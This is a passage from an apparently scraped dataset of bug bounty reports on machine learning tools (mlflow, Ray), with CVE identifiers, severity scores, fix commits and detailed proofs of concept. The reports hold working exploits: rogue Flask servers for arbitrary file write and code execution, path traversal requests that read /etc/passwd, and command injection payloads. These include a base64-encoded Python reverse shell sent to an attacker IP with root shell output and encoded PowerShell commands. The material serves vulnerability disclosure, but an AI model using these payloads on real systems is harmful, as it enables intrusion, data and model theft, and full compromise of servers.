Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    res = Response(\"\"\"\n\"fixed acidity\";\"volatile acidity\";\"citric acid\";\"residual sugar\";\"chlorides\";\"free sulfur dioxide\";\"total sulfur dioxide\";\"density\";\"pH\";\"sulphates\";\"alcohol\";\"quality\"\n7.4;0.7;0;1.9;0.076;11;34;0.9978;3.51;0.56;9.4;5\n7.8;0.88;0;2.6;0.098;25;67;0.9968;3.2;0.68;9.8;5\n    \"\"\")\n    res.headers[\"Content-Disposition\"] = 'attachment; filename=\"/tmp/poc.txt\"'\n    return res\n\napp.run(\"0.0.0.0\", 4444)\n2. Then, run the following code (taken from the documentation), to trigger the vulnerability:\nimport mlflow.data\nimport pandas as pd\nfrom mlflow.data.pandas_dataset import PandasDataset\n\ndataset_source_url = \"http://localhost:4444\"\ndf = pd.read_csv(dataset_source_url)\ndataset: PandasDataset = mlflow.data.from_pandas(df, source=dataset_source_url)\n\nwith mlflow.start_run():\n    mlflow.log_input(dataset, context=\"training\")\n\nrun = mlflow.get_run(mlflow.last_active_run().info.run_id)\ndataset_info = run.inputs.dataset_inputs[0].dataset\n\ndataset_source = mlflow.data.get_source(dataset_info)\ndataset_source.load()\n3. A /tmp/poc.txt file should have been created.\nRemote Code Execution\nLike I've shown in my previous report, using a full controlled file write, it is easy to get an RCE by overwriting .bashrc for example.\nImpact\nA malicious user could use this issue to get command execution on the vulnerable machine and get access to data & models information."}, "https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30/": {"cve": "CVE-2023-6018", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6018", "cwe": "CWE-23: Relative Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/23.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/55c72d02380e8db8118595a4fdae7879cb7ac5bd", "description": "As the framework is quite complex, I'm going to take the default configuration as reference for the whole report.\n  \ud83d\udd12\ufe0f Requirements\nNone: by default no authentication is required.\n  \ud83d\udcdd Description\nThe mlflow web server includes tools for tracking experiments, packaging code into reproducible runs, and sharing and deploying models. It is possible to run it using the following command:\nmlflow ui --host 127.0.0.1:5000\nFrom all provided features, it allows to create AI models. This can be done by making a request to /ajax-api/2.0/mlflow/model-versions/create or using the following curl request:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"...\", \"source\": \"...\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nThis endpoint takes several parameters, but only 2 of them are useful for this issue:\nname: model name.\nsource: model source.\nBelow are the allowed protocols for the source attribute:\n['', 'file', 's3', 'gs', 'wasbs', 'ftp', 'sftp', 'dbfs', 'hdfs', 'viewfs', 'runs', 'models', 'http', 'https', 'mlflow-artifacts']\nFrom all those protocols, this report is going to focus on only 2:\nhttp | https: provided URL path must start with /api/2.0/mlflow-artifacts/artifacts/.\nmodels: this is a custom wrapper which aims to link it to another model.\nThe vulnerability occur in case a model is create with source=models:/<model>/<version> which is associated with another that has http://<attacker>/api/2.0/mlflow-artifacts/artifacts/.\nIn this case, when /model-versions/get-artifact?path=...&name=...&version=... is requested on the first one, it will trigger the following block of code:\nsource: mlflow/mlflow/store/artifact/artifact_repo.py\nif self._is_directory(artifact_path):\n    for file_info in self._iter_artifacts_recursive(artifact_path):\n        if file_info.is_dir:  # Empty directory\n            os.makedirs(os.path.join(dst_path, file_info.path), exist_ok=True)\n        else:\n            fut = _download_file(file_info.path, dst_path)\n            futures[fut] = file_info.path\nelse:\n    fut = _download_file(artifact_path, dst_path)\n    futures[fut] = artifact_path\nThis snippet will do the following:\nRequest /api/2.0/mlflow-artifacts/artifacts on the attacker server (link obtained from the 2nd model).\nParse the JSON response which must match the following structure:\n{\n    \"files\": [\n        {\n            \"path\": \"...\",\n            \"is_dir\": false,\n            \"file_size\": 1\n        }\n    ]\n}\nFor each file listed in the files attribute, it will fetch /api/2.0/mlflow-artifacts/artifacts/[path] and write the output on the path attribute value. As there is no check on it, it will be possible to create and control any file on the system (ie: /tmp/random).\n  \ud83d\udca5 Proof of Concept\nTo abuse this vulnerability, it is necessary to set up a malicious HTTP server which will control the writing path and data. The following one is going to be used for the 2 next PoCs:\nfrom flask import Flask, jsonify\n\napp = Flask(__name__)\napp.config[\"DEBUG\"] = True\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    return \"Hello World!\"\n\n@app.route(\"/api/2.0/mlflow-artifacts/artifacts\")\ndef index():\n    return jsonify({\n        \"files\": [\n            {\n                \"path\": \"/tmp/poc\",\n                \"is_dir\": False,\n                \"file_size\": 50\n            }\n        ]\n    })\n\napp.run(\"0.0.0.0\", 4444)\n  \ud83d\udcc1 Full controlled file write\nStart the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\nStart the rogue server:\npython run.py\nCreate a registered model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\nCreate the first model: (source will be associated to the rogue server)\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"http://127.0.0.1:4444/api/2.0/mlflow-artifacts/artifacts/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nCreate the second model: (source will be associated to the 1st model version)\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"models:/poc/1\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nTrigger the download: (request the 2nd model)\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=random&name=poc&version=2'\nWarning: your version value might change depending on your current server setup!\nAs you can see, /tmp/poc is created!\n  \ud83d\udc68\u200d\ud83d\udcbb Remote Code Execution\nAs this vulnerability allows to write / overwrite any file on the file system, it gives a lot of ways to archive code execution (like overwriting /home/<user>/.bashrc. In the following PoC, I'll provide a way to get an RCE using python internals on the official Docker (source).\nPull the docker:\ndocker pull ghcr.io/mlflow/mlflow\nRun the docker with web server port exposed:\ndocker run -ti -p 5000:5000 ghcr.io/mlflow/mlflow bash\nRun the web server:\nmlflow ui --host 0.0.0.0:5000 &\nUpdate the rogue server to create /usr/local/lib/python3.10/site-packages/random.pth with import os; os.system('whoami > /tmp/poc');\" in the content.\nTrigger the above described vulnerability. (update the http ip to 172.17.0.1 -> care it might be different for you)\nNow that you created the file, run python inside the docker.\nCat /tmp/poc\nMore details about why this is working in sonar's research article: here\n  \ud83d\udcca Data & Models impact\nIn addition of the previously provided PoCs, it would like to justify even more the data & models impact of this issue. Even if the malicious user doesn't manage to get a Remote Code Execution (which shouldn't be the case), he could use it to overwrite any data / model files.\nThanks to this vulnerability, He could even turn this issue to a local file disclosure by changing mlruns/models/poc/version-1/meta.yaml's source value to /etc/ (or any other folder). Then, when he will request /model-versions/get-artifact?path=passwd&name=poc&version=1, which should return the /etc/passwd file content.\nTo do that without knowing the filename, He could simply take part of the fact that /proc/self is linked to the mlflow ui execution folder where mlruns folder is located!\nUsing the rogue web server with the below params should do the job:\nFilename: /proc/self/cwd/mlruns/models/poc/version-1/meta.yaml\nFile content:\naliases: []\ncreation_timestamp: 1692311606475\ncurrent_stage: None\ndescription: ''\nlast_updated_timestamp: 1692311606475\nname: poc\nrun_id: ''\nrun_link: ''\nsource: file:///etc/\nstatus: READY\nstatus_message: null\nuser_id: null\nversion: 1\nImpact\nA malicious user could use this issue to get command execution on the vulnerable machine and get access to data & models information."}, "https://huntr.com/bounties/7b5d130d-38eb-4133-8c7d-0dfc9a9d9896/": {"cve": "CVE-2023-2356", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2356", "cwe": "CWE-23: Relative Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/23.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342", "description": "Description\nBy creating a model version through the REST API endpoint api/2.0/mlflow/registered-models/create and specifying a relative path redirection to the source argument, local server files can be accessed on the tracking server when a subsequent REST API v1.1 call is made tomodel-versions/get-artifact` and providing any path on the local file system.\nProof of Concept\nStart an Mlflow server in default mode\nmlflow server\nUse the REST API to create a model\ncurl -X POST http://mlflowserver:5000/api/2.0/mlflow/registered-models/create -H \"Content-type: application/json\" -d '{\"name\": \"AModel\"}'\nUse the REST API to create a model version by setting the source argument to a relative path (such as root) on the local file system (note that this is not restricted to a uri scheme of 'file://' only. This also works with 'http://', 'https://', 'runs:/', 'mlflow-artifacts:/' and object store locations, provided that the host is not 'localhost' or '127.0.0.1').\ncurl -X POST http://mlflowserver:5000/api/2.0/mlflow/model-versions/create -H \"Content-type: application/json\" -d '{\"name\": \"AModel\", \"source\": file://hostname/../../../../../../../}'\nRetrieve the artifacts from the tracking server's local filesystem\ncurl http://mlflowserver:5000/model-versions/get-artifact?path=etc/passwd&name=TestModel&version=1\nThis will return the file contents of the local password file.\nImpact\nThis exploit allows an attacker to gain access to local files on the tracking server. Accessing sensitive local credentials in the event that open access to the tracking server is provided. Full access to underlying linked object store accounts or hijacking the tracking server is possible with the extracted credentials."}, "https://huntr.com/bounties/0818e9c9-c5fa-4827-a942-8302c96c04ff/": {"cve": "", "cve_link": "", "cwe": "CWE-23: Relative Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/23.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/misp/misp-maltego", "fix_commit": "https://www.github.com/misp/misp-maltego/commit/fce86f7a937cc03794b1fc7e94c630eb65087d9b", "description": "Description\nmisconfigurations of nginx lead to a path traversal vulnerability.\nProof of Concept\nDo a request to /munin../ can get any file under /var/cache/munin/\nImpact\nAn attacker can access files on the web server to which they should not have access."}, "https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe/": {"cve": "CVE-2023-6019", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6019", "cwe": "CWE-78: OS Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/78.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ray-project/ray", "fix_commit": "https://www.github.com/ray-project/ray/commit/193ff8c80067aed4037755cc10f15eb6986dfe95", "description": "Description\nThe Ray Project dashboard contains a CPU profiling page, and the format parameter is not validated before being inserted into a system command executed in a shell, allowing for arbitrary command execution. If the system is configured to allow passwordless sudo (a setup some Ray configurations require) this will result in a root shell being returned to the user. If not configured, a user level shell will be returned:\nProof of Concept\nFor this proof of concept, the attacker machine is 192.168.200.177 and the victim Ray dashboard is 192.168.200.204.\nVictim Ray dashboard ray_dashboard.py (192.168.200.204)\n#!/usr/bin/env python3\nimport ray\ncontext = ray.init(dashboard_host=\"0.0.0.0\")\nprint(context.dashboard_url)\nand run like so:\npython3 -i ray_dashboard.py\nAttacker machine (192.168.200.177)\nuser@attacker:~$ nc -lvvp 4444 &\nListening on 0.0.0.0 4444\n# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.200.177\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])' == cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMjAwLjE3NyIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkn\nuser@attacker:~$ curl 'http://192.168.200.204:8265/worker/cpu_profile?pid=3354&ip=192.168.200.204&duration=5&native=0&format=`echo%20cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMjAwLjE3NyIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkn|base64$IFS-d|sudo%20sh`'\nConnection received on 192.168.200.204 57436\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# whoami\nroot\n# hostname\nray\nImpact\nExploiting this vulnerability allows for a complete remote compromise of the system running the Ray dashboard, including model theft & alteration, total data compromise, and persistent access to an attacker. Ray has specific setup cases for setup with a passwordless sudo, giving the attacker root access. If Ray is not configured for passwordless sudo, the attacker will receive access in the same account the dashboard was run. Both allow for model model theft & alteration, total data compromise, and persistent access to an attacker."}, "https://huntr.com/bounties/5312d6f8-67a5-4607-bd47-5e19966fa321/": {"cve": "CVE-2023-4033", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-4033", "cwe": "CWE-78: OS Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/78.html", "severity_score": "High (8.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/6dde93758d42455cb90ef324407919ed67668b9b", "description": "Description\nThe mlflow cli executable is vulnerable to a command injection attack in mlflow models predict and mlflow models serve actions. The aforementioned actions is defined in file mlflow\\models\\cli.py, and uses a vulnerable predict and serve methods of a dynamically resolved instance of PyFuncBackend class, from a mlflow\\pyfunc\\backend.py file.\n[Bug 1] mlflow models predict command injection\nThe code of the PyFuncBackend.predict method can be seen below:\ndef predict(self, model_uri, input_path, output_path, content_type):\n    \"\"\"\n    Generate predictions using generic python model saved with MLflow. The expected format of\n    the input JSON is the Mlflow scoring format.\n    Return the prediction results as a JSON.\n    \"\"\"\n    local_path = _download_artifact_from_uri(model_uri)\n    # NB: Absolute windows paths do not work with mlflow apis, use file uri to ensure\n    # platform compatibility.\n    local_uri = path_to_local_file_uri(local_path)\n\n    if self._env_manager != _EnvManager.LOCAL:\n        command = (\n            'python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict('\n            \"model_uri={model_uri}, \"\n            \"input_path={input_path}, \"\n            \"output_path={output_path}, \"\n            \"content_type={content_type})\"\n            '\"'\n        ).format(\n            model_uri=repr(local_uri),\n            input_path=repr(input_path),\n            output_path=repr(output_path),\n            content_type=repr(content_type),\n        )\n        return self.prepare_env(local_path).execute(command)\n    else:\n        scoring_server._predict(local_uri, input_path, output_path, content_type)\nThe application dynamically constructs a CMD command by injecting the user input into the predefined placeholders, and passes it to the the mlflow.utils.Environment.execute method, which essentially runs the newly created console command.\nThe application uses built-in python function repr to add quotes around the user input. Nonetheless, repr will not prevent the attacker from injecting a double quote into the CLI parameters to escape from the python -c \"\" parameter, as can be seen from the below example:\n>>> local_uri='LOCAL_URI'\n>>> input_path='INPUT_PATH'\n>>> output_path='OUTPUT_PATH'\n>>> content_type='injection poc\"; we are free now; echo \"escape the rest'\n>>> command = (\n...     'python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict('\n...     \"model_uri={model_uri}, \"\n...     \"input_path={input_path}, \"\n...     \"output_path={output_path}, \"\n...     \"content_type={content_type})\"\n...     '\"'\n... ).format(\n...     model_uri=repr(local_uri),\n...     input_path=repr(input_path),\n...     output_path=repr(output_path),\n...     content_type=repr(content_type),\n... )\n>>> print(command)\npython -c \"from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri='LOCAL_URI', input_path='INPUT_PATH', output_path='OUTPUT_PATH', content_type='injection poc\"; we are free now; echo \"escape the rest')\"\nThus, it is possible to inject arbitrary commands into the parameters of the mlflow models predict function to obtain an unintended code execution.\n[Bug 2] mlflow models serve command injection\nThe code of vulnerable PyFuncBackend.serve method can be seen below.\ndef serve(\n        self,\n        model_uri,\n        port,\n        host,\n        timeout,\n        enable_mlserver,\n        synchronous=True,\n        stdout=None,\n        stderr=None,\n    ):  # pylint: disable=W0221\n        \"\"\"\n        Serve pyfunc model locally.\n        \"\"\"\n        local_path = _download_artifact_from_uri(model_uri)\n\n        server_implementation = mlserver if enable_mlserver else scoring_server\n        command, command_env = server_implementation.get_cmd(\n            local_path, port, host, timeout, self._nworkers\n        )\n\n        ...\n        if self._env_manager != _EnvManager.LOCAL:\n            return self.prepare_env(local_path).execute(\n                command,\n                command_env,\n                stdout=stdout,\n                stderr=stderr,\n                preexec_fn=setup_sigterm_on_parent_death,\n                synchronous=synchronous,\n            )\n        else:\n            _logger.info(\"=== Running command '%s'\", command)\n\n            if os.name != \"nt\":\n                command = [\"bash\", \"-c\", command]\n\n            child_proc = subprocess.Popen(\n                command,\n                env=command_env,\n                preexec_fn=setup_sigterm_on_parent_death,\n                stdout=stdout,\n                stderr=stderr,\n            )\n            ...\nThe above uses get_cmd function, defined in mlflow/pyfunc/scoring_server/__init__.py that directly formats user input into a command string:\ndef get_cmd(\n    model_uri: str, port: int = None, host: int = None, timeout: int = None, nworkers: int = None\n) -> Tuple[str, Dict[str, str]]:\n    local_uri = path_to_local_file_uri(model_uri)\n    timeout = timeout or MLFLOW_SCORING_SERVER_REQUEST_TIMEOUT.get()\n    # NB: Absolute windows paths do not work with mlflow apis, use file uri to ensure\n    # platform compatibility.\n    if os.name != \"nt\":\n        args = [f\"--timeout={timeout}\"]\n        if port and host:\n            args.append(f\"-b {host}:{port}\")\n        elif host:\n            args.append(f\"-b {host}\")\n\n        if nworkers:\n            args.append(f\"-w {nworkers}\")\n\n        command = (\n            f\"gunicorn {' '.join(args)} ${{GUNICORN_CMD_ARGS}}\"\n            \" -- mlflow.pyfunc.scoring_server.wsgi:app\"\n        )\n    else:\n        args = []\n        if host:\n            args.append(f\"--host={host}\")\n\n        if port:\n            args.append(f\"--port={port}\")\n\n        command = (\n            f\"waitress-serve {' '.join(args)} \"\n            \"--ident=mlflow mlflow.pyfunc.scoring_server.wsgi:app\"\n        )\n\n    command_env = os.environ.copy()\n    command_env[_SERVER_MODEL_PATH] = local_uri\n\n    return command, command_env\nProof of Concept\nInstall required dependencies\nInstall the latest version of mlflow\npip install mlflow\nInstall pyenv or conda (prerequisites to get mlflow models predict command to work with non local environments.\nPyenv installation guide\nOR\nConda installation guide\nSetup mlflow environment\nClone the mlflow repository into a local directory\ngit clone https://github.com/mlflow/mlflow\nRun one of the example mlflow scripts that save a model, e.g. examples/sklearn_logistic_regression/train.py to populate the mlruns directory:\ncd mlflow/examples/sklearn_logistic_regression\npython train.py\nList files inside mlruns/0/ directory to get a valid run ID\nls -l mlruns/0/\n\ntotal 8\ndrwxrwxr-x 6 ubuntu ubuntu 4096 Apr 29 19:28 330068e1dfcf43cb8f1cd0e86038d781 # use this id\n-rw-rw-r-- 1 ubuntu ubuntu  227 Apr 29 19:28 meta.yaml\n[Bug 1] Exploitation\nInsert the below payload into input path (-i), output path (-o), or type (-t) parameters:\n\"; YOUR COMMAND HERE; echo \"\nFor example:\nmlflow models predict -m 'runs:/330068e1dfcf43cb8f1cd0e86038d781/model/' -i 'test\"; id; echo \"' -o test\n2023/04/29 19:48:00 INFO mlflow.models.flavor_backend_registry: Selected backend for flavor 'python_function'\n2023/04/29 19:48:00 INFO mlflow.utils.virtualenv: Installing python 3.10.6 if it does not exist\n2023/04/29 19:48:00 INFO mlflow.utils.virtualenv: Environment /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b already exists\n2023/04/29 19:48:00 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && python -c \"\"']'\n2023/04/29 19:48:00 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri=\\'file:///home/ubuntu/Desktop/projects/mlflow/examples/sklearn_logistic_regression/mlruns/0/330068e1dfcf43cb8f1cd0e86038d781/artifacts/model\\', input_path=\\'test\"; id; echo \"\\', output_path=\\'test\\', content_type=\\'json\\')\"']'\n  File \"<string>\", line 1\n    from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri='file:///home/ubuntu/Desktop/projects/mlflow/examples/sklearn_logistic_regression/mlruns/0/330068e1dfcf43cb8f1cd0e86038d781/artifacts/model', input_path='test\n                                                                                                                                                                                                                                   ^\nSyntaxError: unterminated string literal (detected at line 1)\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)\n', output_path='test', content_type='json')\nIf you want to perform some advanced commands that require use of any quotes, you may want to encode your input beforehand.\nInjecting advanced payloads for Linux & virtualenv env manager:\n# example of encoding a payload to echo \"hello from mlflow rce\" & run the \"id\" --env-manager virtualenv\necho 'echo \"hello from mlflow rce!\"; id;' | base64 \n\n# encoded payload\nZWNobyAiaGVsbG8gZnJvbSBtbGZsb3cgcmNlISI7IGlkOwo=\n\n# poc\n$ mlflow models predict -m 'runs:/RUN_ID/model/' -i 'test\"; echo ZWNobyAiaGVsbG8gZnJvbSBtbGZsb3cgcmNlISI7IGlkOwo= | base64 -d | bash; echo \"' -o test\n2023/04/29 20:09:37 INFO mlflow.models.flavor_backend_registry: Selected backend for flavor 'python_function'\n2023/04/29 20:09:37 INFO mlflow.utils.virtualenv: Installing python 3.10.6 if it does not exist\n2023/04/29 20:09:37 INFO mlflow.utils.virtualenv: Environment /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b already exists\n2023/04/29 20:09:37 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && python -c \"\"']'\n2023/04/29 20:09:37 INFO mlflow.utils.environment: === Running command '['bash', '-c', 'source /home/ubuntu/.mlflow/envs/mlflow-ddb80e0d83ed2efe0135e5c6dbae17ed032c869b/bin/activate && python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri=\\'file:///home/ubuntu/Desktop/projects/mlflow/examples/sklearn_logistic_regression/mlruns/0/330068e1dfcf43cb8f1cd0e86038d781/artifacts/model\\', input_path=\\'test\"; echo ZWNobyAiaGVsbG8gZnJvbSBtbGZsb3cgcmNlISI7IGlkOwo= | base64 -d | bash; echo \"\\', output_path=\\'test\\', content_type=\\'json\\')\"']'\n  File \"<string>\", line 1\n    from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri='file:///home/ubuntu/Desktop/projects/mlflow/examples/sklearn_logistic_regression/mlruns/0/330068e1dfcf43cb8f1cd0e86038d781/artifacts/model', input_path='test\n                                                                                                                                                                                                                                   ^\nSyntaxError: unterminated string literal (detected at line 1)\nhello from mlflow rce!\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)\n', output_path='test', content_type='json')\nInjecting advanced payloads for for Windows & conda env manager:\n# example of encoding a payload to echo \"hello from mlflow rce\" & run the \"whoami /all\"\nhttps://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&input=ZWNobyAiaGVsbG8gZnJvbSBtbGZsb3cgcmNlIjsgd2hvYW1pIC9hbGw\n\n# encoded payload \nZQBjAGgAbwAgACIAaABlAGwAbABvACAAZgByAG8AbQAgAG0AbABmAGwAbwB3ACAAcgBjAGUAIgA7ACAAdwBoAG8AYQBtAGkAIAAvAGEAbABsAA==\n\n# poc\n(base) C:\\Temp\\mlflow\\examples\\sklearn_logistic_regression>mlflow models predict --env-manager conda -m mlruns/0/ef785deed8c04b41b88369d777cf1bf8/artifacts/model -i \"test\"\" & powershell -ec ZQBjAGgAbwAgACIAaABlAGwAbABvACAAZgByAG8AbQAgAG0AbABmAGwAbwB3ACAAcgBjAGUAIgA7ACAAdwBoAG8AYQBtAGkAIAAvAGEAbABsAA== & echo \"\" \" -o test -t json\nC:\\Users\\Strawberry\\miniconda3\\lib\\site-packages\\click\\core.py:2322: UserWarning: Use of conda is discouraged. If you use it, please ensure that your use of conda complies with Anaconda's terms of service (https://legal.anaconda.com/policies/en/?name=terms-of-service). virtualenv is the recommended tool for environment reproducibility. To suppress this warning, set the MLFLOW_DISABLE_ENV_MANAGER_CONDA_WARNING (default: False, type: bool) environment variable to 'TRUE'.\n  value = self.callback(ctx, self, value)\n2023/04/30 02:32:40 INFO mlflow.models.flavor_backend_registry: Selected backend for flavor 'python_function'\n2023/04/30 02:32:43 INFO mlflow.utils.conda: Conda environment mlflow-a90f7522e7a3d8452e89ff3700e8e21d677beb9e already exists.\n2023/04/30 02:32:43 INFO mlflow.utils.environment: === Running command '['cmd', '/c', 'conda activate mlflow-a90f7522e7a3d8452e89ff3700e8e21d677beb9e & python -c \"\"']'\n2023/04/30 02:32:43 INFO mlflow.utils.environment: === Running command '['cmd', '/c', 'conda activate mlflow-a90f7522e7a3d8452e89ff3700e8e21d677beb9e & python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict(model_uri=\\'file:///C:/Users/Strawberry/Desktop/projects/mlflow/examples/sklearn_logistic_regression/mlruns/0/ef785deed8c04b41b88369d777cf1bf8/artifacts/model\\', input_path=\\'test\" & powershell -ec ZQBjAGgAbwAgACIAaABlAGwAbABvACAAZgByAG8AbQAgAG0AbABmAGwAbwB3ACAAcgBjAGUAIgA7ACAAdwBoAG8AYQBtAGkAIAAvAGEAbABsAA== & echo \" \\', output_path=\\'test\\', content_type=\\'json\\')\"']'\n  File \"<string>\", line 1\n    \"from\n    ^\nSyntaxError: unterminated string literal (detected at line 1)\nhello from mlflow rce\n\nUSER INFORMATION\n----------------\n\nUser Name                  SID\n========================== =============================================\ndesktop-0gd1eqg\\strawberry S-1-5-21-2872549777-3506415077-326829181-1001\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                                    Type             SID                                           Attributes\n============================================================= ================ ============================================= ==================================================\nEveryone                                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114                                     Group used for deny only\nDESKTOP-0GD1EQG\\docker-users                                  Alias            S-1-5-21-2872549777-3506415077-326829181-1005 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                                        Alias            S-1-5-32-544                                  Group used for deny only\nBUILTIN\\Hyper-V Administrators                                Alias            S-1-5-32-578                                  Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Performance Log Users                                 Alias            S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE                                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                                                 Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users                              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization                                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account                                    Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group\nLOCAL                                                         Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication                              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level                        Label            S-1-16-8192\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n\n\\\" ', output_path='test', content_type='json')\\\"\n[Bug 2] Exploitation\nInsert the command injection payload into the -h (--host) parameter:\nmlflow models serve -m 'runs:/330068e1dfcf43cb8f1cd0e86038d781/model/' -p '80' -h 'localhost & id & 